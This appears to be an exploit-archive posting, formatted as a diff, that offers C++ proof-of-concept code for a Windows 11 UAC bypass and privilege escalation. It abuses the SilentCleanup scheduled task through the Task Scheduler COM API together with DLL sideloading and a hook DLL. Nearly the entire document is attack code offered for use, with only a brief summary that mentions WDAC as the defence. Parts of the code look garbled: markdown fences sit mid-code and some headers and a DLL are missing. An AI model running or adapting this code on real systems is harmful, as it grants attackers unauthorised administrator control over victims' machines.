@@ -1,0 +1,186 @@
+=============================================================================================================================================
+| # Title     : Microsoft Windows 11 build 10.0.22631.6199 Privilege Elevation Tool using Task Scheduler and DLL Sideloading                |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : System built‑in component. No standalone download available.                                                                |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/212252/
+
+[+] Summary : a C++ code snippet that implements a notorious Local Privilege Escalation (LPE) technique on Windows.
+              The code implements a Task Scheduler/DLL Sideloading attack to achieve UAC Bypass/Privilege Escalation by forcing 
+			  the trusted SilentCleanup task to load and execute an attacker-controlled DLL, requiring defense via Application Control (WDAC) and security monitoring to prevent execution path abuse.
+[+]  POC :
+
+#pragma comment(lib, "rpcrt4.lib")
+#pragma comment(lib, "ntdll.lib")
+#pragma comment(lib, "pathcch.lib")
+#pragma comment(lib, "taskschd.lib")
+#pragma comment(lib, "comsupp.lib")
+#pragma comment(lib, "comsuppw.lib")
+#pragma comment(lib, "ole32.lib")
+#pragma comment(lib, "advapi32.lib")
+
+#include <windows.h>
+#include <winternl.h>
+#include <stdio.h>
+#include <string>
+#include <sddl.h>
+#include <pathcch.h>
+#include <comdef.h>
+#include <taskschd.h>
+#include <rpc.h>
+#include <rpcndr.h>
+
+#include "service_h.h"
+#include "RAi_Interface_h.h"
+#include "ScopedHandle.h"
+
+// -------------------------
+// RPC allocation
+// -------------------------
+extern "C" void* __RPC_USER midl_user_allocate(size_t cBytes) { return malloc(cBytes); }
+extern "C" void __RPC_USER midl_user_free(void* p) { free(p); }
+
+// -------------------------
+// Windows Debug Functions
+// -------------------------
+extern "C" void DbgUiSetThreadDebugObject(HANDLE DebugObject);
+extern "C" NTSTATUS DbgUiStopDebugging(HANDLE Process);
+
+// -------------------------
+// Get Executable / DLL Paths
+// -------------------------
+static std::wstring GetExecutablePath() {
+WCHAR path[MAX_PATH];
+DWORD len = MAX_PATH;
+if (!QueryFullProcessImageNameW(GetCurrentProcess(), 0, path, &len)) {
+printf("Error querying process path: %lu\n", GetLastError());
+throw 1;
+}
+return std::wstring(path);
+}
+
+static std::wstring GetDllPath() {
+std::wstring exe = GetExecutablePath();
+WCHAR path[MAX_PATH];
+HRESULT hr = PathCchCombine(path, MAX_PATH, exe.c_str(), L"..\StartProcess.dll");
+if (FAILED(hr)) {
+printf("Error building DLL path: %08X\n", hr);
+throw 1;
+}
+return std::wstring(path);
+}
+
+// -------------------------
+// COM Initialization & Windows Hook
+// -------------------------
+__declspec(dllimport) bool SetupHook();
+__declspec(dllimport) bool RemoveHook();
+
+class CoInit {
+public:
+CoInit() {
+HRESULT hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
+if (FAILED(hr)) { printf("Error initializing COM: %08X\n", hr); throw 1; }
+
+```
+    hr = CoInitializeSecurity(
+        nullptr,
+        -1,
+        nullptr,
+        nullptr,
+        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
+        RPC_C_IMP_LEVEL_IMPERSONATE,
+        nullptr,
+        EOAC_NONE,
+        nullptr
+    );
+    if (FAILED(hr)) { printf("Error initializing COM security: %08X\n", hr); CoUninitialize(); throw 1; }
+}
+~CoInit() { CoUninitialize(); }
+```
+
+};
+
+class WindowsHooker {
+public:
+WindowsHooker() { if (!SetupHook()) { printf("Error setting up windows hook\n"); throw 1; } }
+~WindowsHooker() { RemoveHook(); }
+};
+
+// -------------------------
+// Task Scheduler Elevation
+// -------------------------
+_COM_SMARTPTR_TYPEDEF(ITaskService, IID_ITaskService);
+_COM_SMARTPTR_TYPEDEF(ITaskFolder, IID_ITaskFolder);
+_COM_SMARTPTR_TYPEDEF(IRegisteredTask, IID_IRegisteredTask);
+_COM_SMARTPTR_TYPEDEF(IRunningTask, IID_IRunningTask);
+
+static void ElevateToAdmin() {
+CoInit ci;
+WindowsHooker hooker;
+
+```
+ITaskServicePtr pService;
+HRESULT hr = CoCreateInstance(CLSID_TaskScheduler, nullptr, CLSCTX_INPROC_SERVER, IID_PPV_ARGS(&pService));
+if (FAILED(hr)) { printf("Failed to create ITaskService: %08X\n", hr); return; }
+
+hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
+if (FAILED(hr)) { printf("ITaskService::Connect failed: %08X\n", hr); return; }
+
+ITaskFolderPtr pRootFolder;
+hr = pService->GetFolder(_bstr_t(L"\\Microsoft\\Windows\\DiskCleanup"), &pRootFolder);
+if (FAILED(hr)) { printf("Cannot get DiskCleanup folder: %08X\n", hr); return; }
+
+IRegisteredTaskPtr task;
+hr = pRootFolder->GetTask(_bstr_t(L"SilentCleanup"), &task);
+if (FAILED(hr)) { printf("Cannot get SilentCleanup task: %08X\n", hr); return; }
+
+IRunningTaskPtr running;
+hr = task->RunEx(
+    _variant_t(),                             // Parameters (none)
+    TASK_RUN_IGNORE_CONSTRAINTS,              // Run even if conditions fail
+    -1,                                       // Reserved
+    nullptr,                                  // Reserved
+    &running
+);
+if (FAILED(hr)) { printf("SilentCleanup RunEx failed: %08X\n", hr); return; }
+
+printf("SilentCleanup executed successfully with elevation.\n");
+
+int count = 0;
+while (count < 10) {
+    Sleep(500);
+    TASK_STATE state;
+    hr = task->get_State(&state);
+    if (FAILED(hr)) { printf("Failed to get SilentCleanup task state: %08X\n", hr); return; }
+    if (state != TASK_STATE_RUNNING) break;
+    count++;
+}
+```
+
+}
+
+// -------------------------
+// Main
+// -------------------------
+int wmain(int argc, wchar_t** argv) {
+try {
+if (argc > 1) {
+ElevateToAdmin();
+} else {
+printf("No arguments provided, skipping ElevateToHighIL.\n");
+}
+}
+catch (...) {
+printf("An exception occurred.\n");
+}
+return 0;
+}
+
+
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
